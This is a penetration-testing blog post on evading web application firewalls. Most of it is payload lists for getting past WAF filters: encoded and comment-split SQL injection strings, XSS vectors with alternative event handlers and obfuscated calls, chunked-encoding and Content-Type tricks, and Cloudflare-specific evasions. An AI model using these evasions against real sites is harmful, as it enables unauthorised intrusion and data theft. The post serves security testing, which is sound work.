---
title: "Bypassing WAFs: Techniques That Actually Work"
date: 2024-06-15T08:00:00-05:00
draft: false
tags: ["waf", "bypass", "xss", "sqli", "web-security"]
difficulty: ""
---

WAFs are pattern matchers. They look at your request, compare it against a set of rules, and block anything that looks malicious. The problem with pattern matching is that there are always ways to represent the same payload differently. This post covers techniques I've used to get past Cloudflare, AWS WAF, Akamai, and others.

<!--more-->

## Understanding What You're Bypassing

Before trying random payloads, understand what the WAF is actually checking:

- **Request line**: URL path and query string
- **Headers**: some WAFs inspect specific headers like User-Agent, Referer, Cookie
- **Body**: POST data, JSON bodies, multipart form data
- **Response**: some WAFs also filter responses (outbound detection)

Most WAFs focus heavily on the URL and body. Headers are often checked less thoroughly. Multipart form data and JSON are sometimes parsed differently than URL-encoded data, which creates bypass opportunities.

## Encoding Tricks

The most basic category, but still effective because WAFs and backend servers often decode things differently.

**Double URL encoding**:

```
' OR 1=1--
%27%20OR%201%3D1--          (single encoded - WAF catches this)
%2527%2520OR%25201%253D1--  (double encoded - WAF might miss)
```

This works when the WAF decodes once and passes the still-encoded payload to the backend, which decodes again.

**Unicode/UTF-8 encoding**:

```
<script>     (blocked)
%uff1cscript%uff1e  (fullwidth characters)
\u003cscript\u003e  (unicode escape)
```

**HTML entities** (for XSS in HTML context):

```
<img src=x onerror=alert(1)>           (blocked)
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>  (entity encoded)
```

**Mixed encoding**: combine multiple encoding schemes in one payload. The WAF might decode one layer but not the second.

## HTTP Method and Content-Type Tricks

**Method switching**: the endpoint accepts GET and POST. The WAF only inspects GET parameters:

```
# Blocked
GET /search?q=<script>alert(1)</script>

# Try POST with the same parameter
POST /search
Content-Type: application/x-www-form-urlencoded
q=<script>alert(1)</script>
```

**Content-Type confusion**: send a POST body with an unexpected Content-Type:

```
# Normal (WAF inspects this)
Content-Type: application/x-www-form-urlencoded

# Try these
Content-Type: application/json
Content-Type: text/plain
Content-Type: multipart/form-data; boundary=----abc
Content-Type: application/xml
```

Some WAFs only parse the body if the Content-Type matches what they expect. If the backend is flexible about Content-Type (many frameworks are), you can send the payload in a format the WAF doesn't inspect.

**Multipart boundary tricks**: WAFs parse multipart data by splitting on the boundary. Mess with the boundary definition:

```
Content-Type: multipart/form-data; boundary=----abc; charset=utf-8
Content-Type: multipart/form-data; charset=utf-8; boundary=----abc
Content-Type: multipart/form-data; boundary="----abc"
```

## Chunked Transfer Encoding

Split your payload across multiple chunks. Some WAFs inspect the reassembled body, but some don't:

```
POST /api/search HTTP/1.1
Transfer-Encoding: chunked

3
q=<
4
scri
2
pt
1
>
0

```

If the WAF inspects each chunk individually, it never sees `<script>` as a complete string. The backend reassembles the chunks and processes the full payload.

You can also combine `Content-Length` and `Transfer-Encoding` headers to create ambiguity between the WAF and the backend (this overlaps with HTTP request smuggling, which is its own post).

## SQL Injection Bypasses

WAFs typically block common SQL keywords and patterns: `UNION SELECT`, `OR 1=1`, `'--`, etc.

**Comment injection** to break up keywords:

```sql
UN/**/ION SEL/**/ECT 1,2,3
1' /*!UNION*/ /*!SELECT*/ 1,2,3--
```

MySQL treats `/*!...*/` as executable code. The WAF sees a comment, MySQL executes it.

**Case alternation**:

```sql
uNiOn SeLeCt 1,2,3
```

Lazy regex patterns that match `UNION SELECT` but not `uNiOn SeLeCt`.

**Whitespace alternatives**:

```sql
UNION%09SELECT      (tab)
UNION%0ASELECT      (newline)
UNION%0CSELECT      (form feed)
UNION%A0SELECT      (non-breaking space)
UNION/**/SELECT     (comment as whitespace)
```

**Function alternatives**:

```sql
# Instead of CONCAT()
CONCAT(0x61,0x62,0x63)

# Instead of string literals
SELECT CHAR(97,98,99)

# Instead of quotes
SELECT * FROM users WHERE name=0x61646d696e

# Instead of INFORMATION_SCHEMA
SELECT * FROM mysql.innodb_table_stats
```

**HPP (HTTP Parameter Pollution)**: send the same parameter multiple times:

```
?id=1 UNION&id=SELECT 1,2,3
```

Some backends concatenate duplicate parameters. The WAF might only inspect the first or last value.

## XSS Bypasses

**Event handler alternatives**: if `onerror` is blocked, there are dozens of other event handlers:

```html
<img src=x onpointerover=alert(1)>
<body onpageshow=alert(1)>
<marquee onstart=alert(1)>
<video onloadstart=alert(1)><source>
<details open ontoggle=alert(1)>
<svg onload=alert(1)>
```

**Tag alternatives**:

```html
<svg/onload=alert(1)>
<math><mi/xlink:href="javascript:alert(1)">click</mi></math>
<iframe srcdoc="&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;">
```

**JavaScript without parentheses**:

```html
<img src=x onerror=alert`1`>
<img src=x onerror=window['alert'](1)>
<img src=x onerror=self['ale'+'rt'](1)>
```

**JavaScript without alert**:

```html
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=print()>
<img src=x onerror=top[8680439..toString(30)](1)>
```

That last one: `8680439..toString(30)` evaluates to "alert". The number converted to base 30 produces the string.

## Cloudflare-Specific Bypasses

Cloudflare is the most common WAF you'll encounter. Some things that have worked:

- Use `globalThis` instead of `window`: `<svg/onload=globalThis['alert'](1)>`
- Abuse Cloudflare's JavaScript challenge page: if the WAF is in "challenge" mode rather than "block" mode, automated tools can solve the JS challenge
- Try through non-standard ports if the domain is proxied through Cloudflare but has origin IP exposure
- Cloudflare sometimes doesn't inspect WebSocket upgrade requests as thoroughly

## General Approach

When facing a WAF:

1. Identify the WAF. Check response headers, error pages, and behavior patterns. `wafw00f` automates this.
2. Test what's blocked. Start with obvious payloads and progressively simplify to find exactly which pattern triggers the block.
3. Check different injection points. The WAF might inspect the URL but not JSON bodies, or inspect GET but not POST.
4. Try encoding. Double URL encoding, Unicode, HTML entities, hex.
5. Break up the payload. Comments, whitespace alternatives, chunked encoding.
6. Use alternative syntax. Different tags, event handlers, SQL functions.
7. Combine techniques. Encoding plus alternate syntax plus a different Content-Type.

The key insight is that you're not trying to "hack the WAF." You're exploiting the difference between how the WAF parses your request and how the backend parses it. Find that gap and your payload goes through.